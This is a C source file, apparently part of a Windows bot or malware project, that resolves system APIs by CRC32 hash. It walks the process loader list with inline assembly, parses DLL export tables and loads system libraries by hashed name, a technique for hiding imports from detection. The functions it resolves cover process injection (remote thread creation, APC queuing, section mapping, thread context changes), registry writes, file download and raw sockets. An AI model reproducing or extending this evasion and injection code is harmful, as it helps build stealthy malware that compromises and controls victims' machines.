#include "api.h"
#include "utils.h"
#include "ntheader.h"

#include "string.h"
#include "mem.h"
#include "crypto.h"

extern bot_t bot;

HMODULE WINAPI GetModuleHandleByHash(DWORD dwHash)
{
	LDR_MODULE* pModule = NULL;
	DWORD dwCurrentHash, dwLength;

	_asm
	{
		MOV EAX, FS:[0x18];
		MOV EAX, [EAX + 0x30];
		MOV EAX, [EAX + 0x0C];
		MOV EAX, [EAX + 0x0C];
		MOV pModule, EAX;
	}

	while (pModule->BaseAddress)
	{
		LPWSTR pwzLowerCase = StrToLowerW(pModule->BaseDllName.Buffer, pModule->BaseDllName.Length);

		dwLength = StrLengthW(pwzLowerCase) * 2;

		dwCurrentHash = Crypto_crc32Hash(pwzLowerCase, dwLength);

		if (dwCurrentHash == dwHash)
		{
			return (HMODULE)pModule->BaseAddress;
		}
	
		pModule = (LDR_MODULE*)(struct ModuleInfoNode*)pModule->InLoadOrderModuleList.Flink;
	}

	return (HMODULE)NULL;
}
DWORD WINAPI GetModuleHandleByHashEnd() { return 0; }

BOOL WINAPI _GetAPIModules()
{
	DWORD i;

	module_t module_list[] =
	{
		{ HASH_KERNEL32, &bot.modules.hKernel32 }
	};

	for (i = 0; i < sizeof(module_list) / sizeof(module_t); i++)
	{
		if ((*module_list[i].pModule = GetModuleHandleByHash(module_list[i].dwModuleHash)) == 0)
		{
			return FALSE;
		}
	}

	return TRUE;
}

BOOL WINAPI _GetNTDLLModule()
{
	DWORD i;

	module_t module_list[] =
	{
		{HASH_NTDLL, &bot.modules.hNtdll}
	};

	for (i = 0; i < sizeof(module_list) / sizeof(module_t); i++)
	{
		if ((*module_list[i].pModule = GetModuleHandleByHash(module_list[i].dwModuleHash)) == 0)
		{
			return FALSE;
		}
	}

	return TRUE;
}

BOOL WINAPI _LoadNTDLLFunctions()
{
	DWORD i;

	api_t api_list[] =
	{
		{HASH_NTDLL_NTCREATETHREAD, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtCreateThread},
		{HASH_NTDLL_NTQUERYINFORMATIONPROCESS, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtQueryInformationProcess},
		{HASH_NTDLL_NTQUERYINFORMATIONTHREAD, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtQueryInformationThread},
		{HASH_NTDLL_NTCREATEUSERPROCESS, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtCreateUserProcess},
		{HASH_NTDLL_NTMAPVIEWOFSECTION, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtMapViewOfSection},
		{HASH_NTDLL_NTCREATESECTION, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtCreateSection},
		{HASH_NTDLL_LDRLOADDLL, &bot.modules.hNtdll, (LPVOID*)&bot.api.pLdrLoadDll},
		{HASH_NTDLL_LDRGETDLLHANDLE, &bot.modules.hNtdll, (LPVOID*)&bot.api.pLdrGetDllHandle},
		{HASH_NTDLL_NTWRITEVIRTUALMEMORY, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtWriteVirtualMemory},
		{HASH_NTDLL_NTALLOCATEVIRTUALMEMORY, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtAllocateVirtualMemory},
		{HASH_NTDLL_NTPROTECTVIRTUALMEMORY, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtProtectVirtualMemory},
		{ HASH_NTDLL_NTDEVICEIOCONTROLFILE, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtDeviceIoControlFile},
		{HASH_NTDLL_NTSETCONTEXTTHREAD, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtSetContextThread},
		{HASH_NTDLL_NTOPENPROCESS, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtOpenProcess},
		{HASH_NTDLL_NTCLOSE, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtClose},
		{HASH_NTDLL_NTCREATEFILE, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtCreateFile},
		{HASH_NTDLL_NTOPENFILE, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtOpenFile},
		{HASH_NTDLL_NTDELETEFILE, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtDeleteFile},
		{HASH_NTDLL_NTREADVIRTUALMEMORY, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtReadVirtualMemory},
		{HASH_NTDLL_NTQUERYVIRTUALMEMORY, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtQueryVirtualMemory},
		{HASH_NTDLL_NTOPENTHREAD, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtOpenThread},
		{HASH_NTDLL_NTRESUMETHREAD, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtResumeThread},
		{HASH_NTDLL_NTFREEVIRTUALMEMORY, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtFreeVirtualMemory},
		{HASH_NTDLL_NTFLUSHINSTRUCTIONCACHE, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtFlushInstructionCache},
		{HASH_NTDLL_RTLRANDOMEX, &bot.modules.hNtdll, (LPVOID*)&bot.api.pRtlRandomEx},
		{HASH_NTDLL_NTQUERYSYSTEMINFORMATION, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtQuerySystemInformation},
		{HASH_NTDLL_LDRQUERYPROCESSMODULEINFORMATION, &bot.modules.hNtdll, (LPVOID*)&bot.api.pLdrQueryProcessModuleInformation},
		{HASH_NTDLL_RTLINITUNICODESTRING, &bot.modules.hNtdll, (LPVOID*)&bot.api.pRtlInitUnicodeString},
		{HASH_NTDLL_NTWRITEFILE, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtWriteFile},
		{HASH_NTDLL_NTREADFILE, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtReadFile},
		{HASH_NTDLL_NTDELAYEXECUTION, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtDelayExecution},
		{HASH_NTDLL_NTOPENKEY, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtOpenKey},
		{HASH_NTDLL_NTSETVALUEKEY, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtSetValueKey},
		{HASH_NTDLL_NTQUERYVALUEKEY, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtQueryValueKey},
		{HASH_NTDLL_RTLFORMATCURRENTUSERKEYPATH, &bot.modules.hNtdll, (LPVOID*)&bot.api.pRtlFormatCurrentUserKeyPath},
		{HASH_NTDLL_NTQUERYINFORMATIONFILE, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtQueryInformationFile}
	};

	for (i = 0; i < sizeof(api_list) / sizeof(api_t); i++)
	{
		*api_list[i].pFunction = GetProcAddressByHash(*api_list[i].pModule, api_list[i].dwFunctionHash);
	}
	
	return TRUE;
}
/*

*/
HMODULE WINAPI LoadLibraryByHash(DWORD dwHash)
{
	LPWSTR pwzSystemDir;
	WIN32_FIND_DATAW ffd;
	HANDLE hFile;
	DWORD dwCurrentHash;
	HMODULE hMod;

	if ((pwzSystemDir = GetSystem32Dir()) == NULL)
		return 0;

	if (!StrConcatW(&pwzSystemDir, L"\\*.dll"))
		return 0;

	hMod = 0;

	memzero(&ffd, sizeof(WIN32_FIND_DATAW));

	if ((hFile = bot.api.pFindFirstFileW(pwzSystemDir, &ffd)) != INVALID_HANDLE_VALUE)
	{
		while (TRUE)
		{
			if (!bot.api.pFindNextFileW(hFile, &ffd))
				break;

			if (hFile == INVALID_HANDLE_VALUE)
				break;

			dwCurrentHash = Crypto_crc32Hash(ffd.cFileName, StrLengthW(ffd.cFileName) * 2);

			if (dwCurrentHash == dwHash)
			{
				hMod = bot.api.pLoadLibraryW(ffd.cFileName);
				break;
			}
		}
	}

	memfree(pwzSystemDir);

	return hMod;
}

BOOL WINAPI _LoadAPIModules()
{
	DWORD i;

	module_t load_module_list[] =
	{
		{ HASH_USER32, &bot.modules.hUser32 },
		{ HASH_WININET, &bot.modules.hWininet },
		{ HASH_SHELL32, &bot.modules.hShell32 },
		{ HASH_ADVAPI32, &bot.modules.hAdvapi32 },
		{HASH_URLMON, &bot.modules.hUrlmon },
		{HASH_WS2_32, &bot.modules.hWs2_32},
		{HASH_SHLWAPI, &bot.modules.hShlwapi}
	};

	for (i = 0; i < sizeof(load_module_list) / sizeof(module_t); i++)
	{
		if ((*load_module_list[i].pModule = LoadLibraryByHash(load_module_list[i].dwModuleHash)) == 0)
			return FALSE;
	}

	return TRUE;
}

LPVOID WINAPI GetProcAddressByHash(HMODULE module, DWORD dwHash)
{
#if defined _WIN64
	PIMAGE_NT_HEADERS64 ntHeaders;
#else
	PIMAGE_NT_HEADERS32 ntHeaders;
#endif
	PIMAGE_DATA_DIRECTORY impDir;
	PIMAGE_EXPORT_DIRECTORY ied;

	LPDWORD curName;
	DWORD i, dwCurrentHash;
	LPSTR pszFunction;
	LPWORD pw;

	if (module == NULL)
		return NULL;

#if defined _WIN64
	ntHeaders = (PIMAGE_NT_HEADERS64)((LPBYTE)module + ((PIMAGE_DOS_HEADER)module)->e_lfanew);
#else
	ntHeaders = (PIMAGE_NT_HEADERS32)((LPBYTE)module + ((PIMAGE_DOS_HEADER)module)->e_lfanew);
#endif
	impDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	ied = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)module + impDir->VirtualAddress);

	for (i = 0; i < ied->NumberOfNames; i++)
	{
		curName = (LPDWORD)(((LPBYTE)module) + ied->AddressOfNames + i * sizeof(DWORD));
		pszFunction = (LPSTR)((LPBYTE)module + *curName);

		dwCurrentHash = Crypto_crc32Hash(pszFunction, StrLengthA(pszFunction));

		if (curName && pszFunction && dwCurrentHash == dwHash)
		{
			pw = (LPWORD)(((LPBYTE)module) + ied->AddressOfNameOrdinals + i * sizeof(WORD));
			curName = (LPDWORD)(((LPBYTE)module) + ied->AddressOfFunctions + (*pw) * sizeof(DWORD));
			return ((LPBYTE)module + *curName);
		}
	}

	return NULL;
}
DWORD WINAPI GetProcAddressByHashEnd(void) { return 0; }

BOOL WINAPI API_LoadKernel32Functions()
{
	DWORD i;

	api_t api_list[] =
	{
		{ HASH_KERNEL32_VIRTUALALLOC, &bot.modules.hKernel32, (LPVOID*)&bot.api.pVirtualAlloc },
		{ HASH_KERNEL32_VIRTUALFREE, &bot.modules.hKernel32, (LPVOID*)&bot.api.pVirtualFree },
		{ HASH_KERNEL32_WRITEPROCESSMEMORY, &bot.modules.hKernel32, (LPVOID*)&bot.api.pWriteProcessMemory },
		{ HASH_KERNEL32_CREATETOOLHELP32SNAPSHOT, &bot.modules.hKernel32, (LPVOID*)&bot.api.pCreateToolhelp32Snapshot },
		{ HASH_KERNEL32_VIRTUALALLOCEX, &bot.modules.hKernel32, (LPVOID*)&bot.api.pVirtualAllocEx },
		{ HASH_KERNEL32_VIRTUALFREEEX, &bot.modules.hKernel32, (LPVOID*)&bot.api.pVirtualFreeEx },
		{ HASH_KERNEL32_PROCESS32FIRSTW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pProcess32FirstW },
		{ HASH_KERNEL32_PROCESS32NEXTW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pProcess32NextW },
		{ HASH_KERNEL32_CLOSEHANDLE, &bot.modules.hKernel32, (LPVOID*)&bot.api.pCloseHandle },
		{ HASH_KERNEL32_CREATEPROCESSW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pCreateProcessW },
		{ HASH_KERNEL32_VIRTUALPROTECT, &bot.modules.hKernel32, (LPVOID*)&bot.api.pVirtualProtect },
		{ HASH_KERNEL32_OPENPROCESS, &bot.modules.hKernel32, (LPVOID*)&bot.api.pOpenProcess },
		{ HASH_KERNEL32_CREATEREMOTETHREAD, &bot.modules.hKernel32, (LPVOID*)&bot.api.pCreateRemoteThread },
		{ HASH_KERNEL32_EXITPROCESS, &bot.modules.hKernel32, (LPVOID*)&bot.api.pExitProcess },
		{ HASH_KERNEL32_GETMODULEFILENAMEW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pGetModuleFileNameW },
		{ HASH_KERNEL32_DELETEFILEW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pDeleteFileW },
		{ HASH_KERNEL32_LOADLIBRARYW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pLoadLibraryW },
		{ HASH_KERNEL32_ISWOW64PROCESS, &bot.modules.hKernel32, (LPVOID*)&bot.api.pIsWow64Process },
		{ HASH_KERNEL32_GETWINDOWSDIRECTORYW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pGetWindowsDirectoryW },
		{ HASH_KERNEL32_QUEUEUSERAPC, &bot.modules.hKernel32, (LPVOID*)&bot.api.pQueueUserAPC },
		{ HASH_KERNEL32_RESUMETHREAD, &bot.modules.hKernel32, (LPVOID*)&bot.api.pResumeThread },
		{ HASH_KERNEL32_GETSYSTEMDIRECTORYW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pGetSystemDirectoryW },
		{ HASH_KERNEL32_FINDFIRSTFILEW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pFindFirstFileW },
		{ HASH_KERNEL32_FINDNEXTFILEW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pFindNextFileW },
		{HASH_KERNEL32_CREATETHREAD, &bot.modules.hKernel32, (LPVOID*)&bot.api.pCreateThread},
		{HASH_KERNEL32_CREATEFILEW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pCreateFileW},
		{HASH_KERNEL32_WRITEFILE, &bot.modules.hKernel32, (LPVOID*)&bot.api.pWriteFile},
		{HASH_KERNEL32_READFILE, &bot.modules.hKernel32, (LPVOID*)&bot.api.pReadFile},
		{HASH_KERNEL32_GETFILESIZE, &bot.modules.hKernel32, (LPVOID*)&bot.api.pGetFileSize},
		{HASH_KERNEL32_GETVERSIONEXW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pGetVersionExW},
		{HASH_KERNEL32_FINDFIRSTVOLUMEW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pFindFirstVolumeW},
		{HASH_KERNEL32_GETVOLUMEINFORMATIONW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pGetVolumeInformationW},
		{HASH_KERNEL32_FINDVOLUMECLOSE, &bot.modules.hKernel32, (LPVOID*)&bot.api.pFindVolumeClose},
		{HASH_KERNEL32_MULTIBYTETOWIDECHAR, &bot.modules.hKernel32, (LPVOID*)&bot.api.pMultiByteToWideChar},
		{HASH_KERNEL32_GETMODULEHANDLEW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pGetModuleHandleW},
		{HASH_KERNEL32_FLUSHINSTRUCTIONCACHE, &bot.modules.hKernel32, (LPVOID*)&bot.api.pFlushInstructionCache},
		{HASH_KERNEL32_GETCURRENTPROCESS, &bot.modules.hKernel32, (LPVOID*)&bot.api.pGetCurrentProcess},
		{HASH_KERNEL32_THREAD32FIRST, &bot.modules.hKernel32, (LPVOID*)&bot.api.pThread32First},
		{HASH_KERNEL32_THREAD32NEXT, &bot.modules.hKernel32, (LPVOID*)&bot.api.pThread32Next},
		{HASH_KERNEL32_OPENMUTEXW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pOpenMutexW},
		{HASH_KERNEL32_CREATEMUTEXW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pCreateMutexW},
		{HASH_KERNEL32_VIRTUALQUERY, &bot.modules.hKernel32, (LPVOID*)&bot.api.pVirtualQuery},
		{HASH_KERNEL32_GETCURRENTPROCESSID, &bot.modules.hKernel32, (LPVOID*)&bot.api.pGetCurrentProcessId},
		{HASH_KERNEL32_CREATEFILEMAPPINGW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pCreateFileMappingW},
		{HASH_KERNEL32_MAPVIEWOFFILE, &bot.modules.hKernel32, (LPVOID*)&bot.api.pMapViewOfFile},
		{HASH_KERNEL32_UNMAPVIEWOFFILE, &bot.modules.hKernel32, (LPVOID*)&bot.api.pUnmapViewOfFile},
		{HASH_KERNEL32_DUPLICATEHANDLE, &bot.modules.hKernel32, (LPVOID*)&bot.api.pDuplicateHandle},
		{HASH_KERNEL32_GETCURRENTTHREAD, &bot.modules.hKernel32, (LPVOID*)&bot.api.pGetCurrentThread},
		{HASH_KERNEL32_FLUSHFILEBUFFERS, &bot.modules.hKernel32, (LPVOID*)&bot.api.pFlushFileBuffers},
		{HASH_KERNEL32_DISCONNECTNAMEDPIPE, &bot.modules.hKernel32, (LPVOID*)&bot.api.pDisconnectNamedPipe},
		{HASH_KERNEL32_GETPROCADDRESS, &bot.modules.hKernel32, (LPVOID*)&bot.api.pGetProcAddress},
		{HASH_KERNEL32_RTLINITIALIZECRITICALSECTION, &bot.modules.hNtdll, (LPVOID*)&bot.api.pRtlInitializeCriticalSection},
		{HASH_KERNEL32_RTLENTERCRITICALSECTION, &bot.modules.hNtdll, (LPVOID*)&bot.api.pRtlEnterCriticalSection},
		{HASH_KERNEL32_WIDECHARTOMULTIBYTE, &bot.modules.hKernel32, (LPVOID*)&bot.api.pWideCharToMultiByte},
		{HASH_KERNEL32_RTLLEAVECRITICALSECTION, &bot.modules.hNtdll, (LPVOID*)&bot.api.pRtlLeaveCriticalSection},
		{HASH_KERNEL32_TERMINATETHREAD, &bot.modules.hKernel32, (LPVOID*)&bot.api.pTerminateThread},
		{HASH_KERNEL32_GETTICKCOUNT, &bot.modules.hKernel32, (LPVOID*)&bot.api.pGetTickCount}
	};

	for (i = 0; i < sizeof(api_list) / sizeof(api_t); i++)
	{
		if((*api_list[i].pFunction = GetProcAddressByHash(*api_list[i].pModule, api_list[i].dwFunctionHash)) == NULL)
		{
			return FALSE;
		}
	}

	return TRUE;
}

BOOL WINAPI _LoadLoadedAPIFunctions()
{
	DWORD i;

	api_t api_list[] =
	{
		{HASH_USER32_WSPRINTFW, &bot.modules.hUser32, (LPVOID*)&bot.api.pwsprintfW},
		{ HASH_USER32_WSPRINTFA, &bot.modules.hUser32, (LPVOID*)&bot.api.pwsprintfA},
		{HASH_WININET_INTERNETOPENW, &bot.modules.hWininet, (LPVOID*)&bot.api.pInternetOpenW},
		{HASH_WININET_INTERNETCONNECTA, &bot.modules.hWininet, (LPVOID*)&bot.api.pInternetConnectA},
		{HASH_WININET_INTERNETCONNECTW, &bot.modules.hWininet, (LPVOID*)&bot.api.pInternetConnectW},
		{HASH_WININET_HTTPOPENREQUESTA, &bot.modules.hWininet, (LPVOID*)&bot.api.pHttpOpenRequestA},
		{HASH_WININET_HTTPOPENREQUESTW, &bot.modules.hWininet, (LPVOID*)&bot.api.pHttpOpenRequestW},
		{HASH_WININET_HTTPSENDREQUESTA, &bot.modules.hWininet, (LPVOID*)&bot.api.pHttpSendRequestA},
		{HASH_WININET_HTTPSENDREQUESTW, &bot.modules.hWininet, (LPVOID*)&bot.api.pHttpSendRequestW},
		{HASH_WININET_INTERNETREADFILE, &bot.modules.hWininet, (LPVOID*)&bot.api.pInternetReadFile},
		{HASH_WININET_INTERNETCLOSEHANDLE, &bot.modules.hWininet, (LPVOID*)&bot.api.pInternetCloseHandle},
		{HASH_SHELL32_SHGETFOLDERPATHW, &bot.modules.hShell32, (LPVOID*)&bot.api.pSHGetFolderPathW},
		{HASH_ADVAPI32_GETUSERNAMEA, &bot.modules.hAdvapi32, (LPVOID*)&bot.api.pGetUserNameA},
		{HASH_USER32_GETCURSORPOS, &bot.modules.hUser32, (LPVOID*)&bot.api.pGetCursorPos},
		{HASH_URLMON_URLDOWNLOADTOFILEW, &bot.modules.hUrlmon, (LPVOID*)&bot.api.pURLDownloadToFileW},
		{HASH_WS2_32_WSASTARTUP, &bot.modules.hWs2_32, (LPVOID*)&bot.api.pWSAStartup},
		{HASH_WS2_32_WSACLEANUP, &bot.modules.hWs2_32, (LPVOID*)&bot.api.pWSACleanup},
		{HASH_WS2_32_SOCKET, &bot.modules.hWs2_32, (LPVOID*)&bot.api.psocket},
		{HASH_WS2_32_CONNECT, &bot.modules.hWs2_32, (LPVOID*)&bot.api.pconnect},
		{HASH_WS2_32_SEND, &bot.modules.hWs2_32, (LPVOID*)&bot.api.psend},
		{HASH_WS2_32_RECV, &bot.modules.hWs2_32, (LPVOID*)&bot.api.precv},
		{HASH_WS2_32_CLOSESOCKET, &bot.modules.hWs2_32, (LPVOID*)&bot.api.pclosesocket},
		{HASH_WS2_32_FREEADDRINFO, &bot.modules.hWs2_32, (LPVOID*)&bot.api.pfreeaddrinfo},
		{HASH_WS2_32_BIND, &bot.modules.hWs2_32, (LPVOID*)&bot.api.pbind},
		{HASH_WS2_32_LISTEN, &bot.modules.hWs2_32, (LPVOID*)&bot.api.plisten},
		{HASH_WS2_32_ACCEPT, &bot.modules.hWs2_32, (LPVOID*)&bot.api.paccept},
		{HASH_WS2_32_SELECT, &bot.modules.hWs2_32, (LPVOID*)&bot.api.pselect},
		{HASH_WS2_32__WSAFDISSET, &bot.modules.hWs2_32, (LPVOID*)&bot.api.p__WSAFDIsSet},
		{HASH_SHLWAPI_WVNSPRINTFA, &bot.modules.hShlwapi, (LPVOID*)&bot.api.pwvnsprintfA},
		{HASH_SHLWAPI_WVNSPRINTFW, &bot.modules.hShlwapi, (LPVOID*)&bot.api.pwvnsprintfW},
		{HASH_SHLWAPI_STRSTRA, &bot.modules.hShlwapi, (LPVOID*)&bot.api.pStrStrA},
		{HASH_SHLWAPI_STRSTRW, &bot.modules.hShlwapi, (LPVOID*)&bot.api.pStrStrW}
	};

	for (i = 0; i < sizeof(api_list) / sizeof(api_t); i++)
	{
		if ((*api_list[i].pFunction = GetProcAddressByHash(*api_list[i].pModule, api_list[i].dwFunctionHash)) == NULL)
			return FALSE;
	}
	return TRUE;
}

BOOL WINAPI InitializeAPI()
{
	if (_GetAPIModules() && _GetNTDLLModule() && _LoadNTDLLFunctions())
	{
		if (API_LoadKernel32Functions())
		{
			if (_LoadAPIModules())
			{
				return _LoadLoadedAPIFunctions();
			}
		}
	}
	return FALSE;
}